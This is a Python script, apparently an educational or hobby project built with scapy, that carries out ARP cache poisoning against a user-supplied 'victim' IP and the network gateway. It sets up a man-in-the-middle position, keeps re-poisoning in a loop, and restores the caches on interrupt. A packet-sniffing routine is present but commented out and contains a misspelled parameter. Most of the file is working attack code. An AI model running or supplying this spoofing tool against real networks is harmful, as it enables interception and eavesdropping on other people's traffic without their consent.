import threading
import time

from scapy.all import send ,srp
from scapy.config import conf
from scapy.layers.dot11 import Dot11
from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import Ether,ARP
from scapy.sendrecv import sniff
import socket
import scapy as scapy


def restore(target_ip, host_ip, verbose=True):
   """
   Restores the normal process of a regular network
   This is done by sending the original informations
   (real IP and MAC of `host_ip` ) to `target_ip`
   """
   # get the real MAC address of target
   target_mac = get_mac(target_ip)
   # get the real MAC address of spoofed (gateway, i.e router)
   host_mac = get_mac(host_ip)
   # crafting the restoring packet
   arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
   # sending the restoring packet
   # to restore the network to its normal process
   # we send each reply seven times for a good measure (count=7)
   send(arp_response, verbose=0, count=7)
   if verbose:
      print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


def get_mac(ip):
   """
   Returns MAC address of any device connected to the network
   If ip is down, returns None instead
   """
   ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
   if ans:
      return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
   """
   Spoofs `target_ip` saying that we are `host_ip`.
   it is accomplished by changing the ARP cache of the target (poisoning)
   """
   # get the mac address of the target
   target_mac = get_mac(target_ip)
   # craft the arp 'is-at' operation packet, in other words; an ARP response
   # we don't specify 'hwsrc' (source MAC address)
   # because by default, 'hwsrc' is the real MAC address of the sender (ours)
   arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
   # send the packet
   # verbose = 0 means that we send the packet without printing any thing
   send(arp_response, verbose=0)
   if verbose:
      # get the MAC address of the default interface we are using
      self_mac = ARP().hwsrc
      print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def dissect_packet(packet):
   print(packet.summary(),end=f"\n\n")
   time.sleep(0.5)


def redirect_packets(targer_ip):
   try:
      capture=sniff(filter=f"(host {target_ip})",prn=dissect_packet,store=0)
   except IndexError as e:
      print(e)

if __name__ == '__main__':

   target_ip=input("Enter victim ip:\n")
   try:
      gate_way_ip = str(conf.route.route("0.0.0.0")[2])
      print(gate_way_ip)

      #sniff_thread=threading.Thread(target=redirect_packets,args=(target_ip,))
      #sniff_thread.start()
      while True:
         spoof(target_ip,gate_way_ip)
         spoof(gate_way_ip,target_ip)
         time.sleep(1)
   except KeyboardInterrupt:
      restore(target_ip,gate_way_ip)
      pass




# See PyCharm help at https://www.jetbrains.com/help/pycharm/
